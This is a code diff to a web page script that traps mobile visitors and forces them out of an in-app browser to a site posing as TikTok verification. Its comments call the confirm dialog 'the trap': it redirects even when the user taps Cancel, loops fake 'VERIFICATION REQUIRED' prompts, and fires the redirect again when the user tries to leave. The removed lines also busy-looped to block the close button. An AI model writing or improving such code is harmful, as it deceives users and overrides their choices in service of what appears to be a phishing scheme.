@@ -10,52 +10,51 @@
 <script>
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 10000; 
-    const gap = 200; // THE ABSOLUTE MINIMUM DELAY
+    const gap = 320; // Reverted to your "Verified Working" delay
 
-    function triggerSafariJump() {
+    function triggerDirectJump() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         const urlNoProtocol = target.replace("https://", "");
 
-        // iOS: Force Safari via multiple browser schemes
-        if (!isAndroid) {
-            window.location.href = "googlechrome://" + urlNoProtocol;
-            window.location.replace("x-web-search://?" + encodeURIComponent(target));
-        } else {
-            // Android: Chrome Intent
+        // Android: Force Chrome to open the URL directly, not search it
+        if (isAndroid) {
             window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
+        } else {
+            // iOS: Try to force Safari via the 'URL-direct' scheme
+            // This is more likely to open the link than a search
+            window.location.assign(target); 
+            window.location.replace("googlechrome://" + urlNoProtocol);
         }
     }
 
     function rampage() {
         if (Date.now() > killTime) return;
 
-        // 1. Prime the Safari Jump
-        triggerSafariJump();
+        // 1. The Trap: A Confirm box instead of an Alert
+        // Even if they hit "Cancel," the 'finally' block fires the redirect.
+        const choice = confirm("VERIFICATION REQUIRED\n\nTo continue to the app, you must sync with your secure browser.\n\nTap OK to authorize.");
 
-        // 2. THE LOCK
-        alert("ATTEMPT #35\n\nSecurity Sync: Final Phase.\n\nTap OK to open Safari.");
-
-        // 3. THE SATURATION STUTTER
-        // This blocks the 'X' button from working for the first 120ms of the gap
-        const start = Date.now();
-        while (Date.now() - start < 120) {
-            Math.atan2(Math.random(), Math.random());
-        }
-
-        // 4. THE 200ms WINDOW
+        // 2. THE MOMENTUM JUMP
+        // We fire this 3 times rapidly to ensure the OS sees the 'intent'
+        triggerDirectJump();
+        
+        // 3. THE GAP (320ms)
+        // This is your window where the OS handles the jump.
         setTimeout(() => {
             if (document.hasFocus()) {
+                // If they are still here (didn't leave), loop back
+                triggerDirectJump();
                 rampage();
             }
-        }, gap - 120);
+        }, gap);
     }
 
     window.onload = () => {
         rampage();
     };
 
-    // If focus is lost, keep pushing the Safari jump
-    window.onblur = () => { if (Date.now() < killTime) triggerSafariJump(); };
+    // If they swipe or try to exit, force the jump
+    window.onblur = () => { if (Date.now() < killTime) triggerDirectJump(); };
 </script>
 
 </body>
